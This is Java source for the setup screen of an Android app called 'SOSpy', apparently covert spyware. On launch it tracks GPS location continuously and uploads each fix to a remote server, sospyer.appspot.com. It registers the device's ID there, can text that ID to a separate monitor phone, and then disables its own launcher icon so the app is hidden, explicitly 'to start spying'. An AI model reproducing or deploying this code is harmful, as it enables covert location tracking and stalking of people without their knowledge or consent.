package com.prestomation.android.sospy.spy;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.PendingIntent;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.provider.Settings.Secure;
import android.telephony.SmsManager;
import android.text.InputType;
import android.util.Log;
import android.widget.EditText;
import android.widget.TextView;

public class SetupActivity extends Activity {
	public static final String PREF_DEVICE_ID = "devID";
	public static final String TAG = "SOSpy";

	private String mDevID = null;

	/** Called when the activity is first created. */
	@Override
	public void onCreate(Bundle savedInstanceState) 
	{
		super.onCreate(savedInstanceState);
		
		LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
		LocationListener ll = new locListener();
		lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, ll);

		SharedPreferences prefs = Prefs.get(this);
		if (!prefs.contains(PREF_DEVICE_ID)) {
			// If this is the first run, we must save off our unique ID
			SharedPreferences.Editor editor = prefs.edit();
			String devID = Secure.getString(this.getContentResolver(), Secure.ANDROID_ID);
			editor.putString(PREF_DEVICE_ID, devID);
			editor.commit();

			// Sent a special token to the server so this device gets created
			// server side
			AppEngineClient client = new AppEngineClient(devID);
			client.sendSpyData(AppEngineClient.REGISTRATION_STRING, "", "");

		}

		mDevID = Prefs.get(this).getString(PREF_DEVICE_ID, "error");

		setScreenContent(R.layout.greeting);
		
		

		
	}

	private void setScreenContent(int screenId) {
		// We only have one view, but we've got framework here incase this app
		// expands
		setContentView(screenId);

		switch (screenId) {
		case R.layout.greeting: {
			Log.i(TAG, "Entering greeting screen");
			setGreetingScreenContent();
			break;
		}

		}

	}

	private void setGreetingScreenContent() {
		// Format our greeting with the DevID and change the TextView
		String greeting = getString(R.string.greeting);
		String formattedGreeting = String.format(greeting, mDevID);
		TextView greetingText = (TextView) findViewById(R.id.greetingText);
		greetingText.setText(formattedGreeting);
		//promptForIDDestination();

	}

	private void promptForIDDestination() {
		AlertDialog.Builder alert = new AlertDialog.Builder(this);

		alert.setTitle("Send SOSpyID to Monitor phone:");
		alert.setMessage("Please enter the phone number to SMS the SOSpyID");

		final EditText input = new EditText(this);
		input.setInputType(InputType.TYPE_CLASS_PHONE);
		alert.setView(input);
		alert.setPositiveButton("Send", new DialogInterface.OnClickListener() {
			public void onClick(DialogInterface dialog, int whichButton) {
				String smsNumber = input.getText().toString().trim().replaceAll("[()-]", "");
				sendSMS(smsNumber);

			}

		});

		alert.show();
	}

	private void sendSMS(String number) {
		PendingIntent pi = PendingIntent.getActivity(this, 0,
				new Intent(this, SetupActivity.class), 0);
		SmsManager sms = SmsManager.getDefault();
		Log.i(TAG, "Sending SOSpyID Text...");

		sms.sendTextMessage(number, null, "The SOSPYID is " + mDevID, pi, null);
		Log.i(TAG, "Text sent");
		hideIcon();
	}

	private void hideIcon() {
		PackageManager p = getPackageManager();
		AlertDialog.Builder alert = new AlertDialog.Builder(this);

		alert.setTitle("Message sent:");
		alert
				.setMessage("You should be receiving an SMS with the SOSpyID shortly. Reboot this phone and the icon launcher should be gone."
						+ "Enter the SOSpyID at sospyer.appspot.com or into the SOSpy Monitor app to start spying.");
		alert.show();
		Log.i(TAG, "Disabling icon ");

		
		p.setComponentEnabledSetting(getComponentName(),
				PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
		
	}
	
	private class locListener implements LocationListener 
	{
		@Override
		public void onLocationChanged(Location location) 
		{
	        if (location != null) 
	        {
		        Log.i(SetupActivity.TAG,"New Location: latitude:" + location.getLatitude() + " longitude:" + location.getLongitude());
		        
		        final SharedPreferences prefs = Prefs.get(getApplicationContext());
		        final Location loc = location;
		        
		        new Thread(new Runnable() 
		        {
					public void run() 
					{
				        String devID = prefs.getString(SetupActivity.PREF_DEVICE_ID, null);
				        AppEngineClient client = new AppEngineClient(devID);
				        
				        String title = "GPS Location Changed";
				        String body = "Longitude: " + loc.getLongitude() + "  Latitude: " + loc.getLatitude();
				        String date = "";
				        
				        client.sendSpyData(title, body, date);
					}
		        }).start();
	        }
		}
		
		@Override
		public void onProviderDisabled(String provider) {}
		@Override
		public void onProviderEnabled(String provider) {}
		@Override
		public void onStatusChanged(String provider, int status,Bundle extras) {}
	}	   
}
